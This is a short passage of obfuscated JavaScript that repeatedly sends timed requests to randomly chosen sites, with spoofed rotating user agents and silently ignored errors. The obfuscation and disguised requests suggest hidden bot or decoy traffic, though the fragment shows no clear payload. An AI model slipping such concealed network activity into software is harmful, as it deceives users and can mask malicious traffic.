      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x640 + -0xc * -0x24a + -0x38 * -0x1c) * getRandomInt(-0x1 * 0x1f61 + -0x21 * 0x29 + 0x24ab, 0x183b + -0x1 * -0x5d + -0x1893));
}, 0x3cf + -0x97a + 0x60f);